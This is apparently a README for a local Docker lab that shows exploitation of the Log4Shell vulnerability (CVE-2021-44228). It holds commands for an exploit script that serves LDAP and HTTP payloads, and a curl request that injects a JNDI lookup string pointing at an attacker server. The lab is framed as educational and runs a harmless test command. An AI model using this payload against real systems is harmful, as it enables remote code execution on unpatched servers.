## Log4j RCE Vulnerability (CVE-2021-44228)
This is for educational purposes only. This contains docker files to create the testing environment for this exploit

### Building and running the testing environment
Start the [vulnerable app](https://github.com/christophetd/log4shell-vulnerable-app) and test server
```bash
docker-compose up
```
### Exploitation
Open a new terminal and get an access to the test server
```bash
docker exec -it log4j_attacker bash
```
#### Full Exploitation
```bash
./log4j.rb -t http://10.10.10.2:8080 -a 10.10.10.3  -l 1389 -h 1010 -c 'touch /dev/shm/vulnerable' -i 'sys:os.name'
```
#### Serve the payload
Start the HTTP and LDAP Servers
```bash
./log4j.rb -t http://10.10.10.2:8080 -a 10.10.10.3  -l 1389 -h 1010 -c 'touch /dev/shm/vulnerable' -i 'sys:os.name' -s
```
Open a new terminal in the test server
```bash
docker exec -it log4j_attacker bash
# inside the test server
curl http://10.10.10.2:8080 -H 'X-Api-Version: ${jndi:ldap://10.10.10.3:1389/${sys:os.name}}'
```

### Credits
- [christophetd](https://github.com/christophetd) for the [vulnerable app](https://github.com/christophetd/log4shell-vulnerable-app)
- [alexandre-lavoie's](https://github.com/alexandre-lavoie) [code](https://github.com/alexandre-lavoie/python-log4rce) for my reference while working on this project

### Notes
This is for educational purposes only. Please use responsibly if you want to test it.
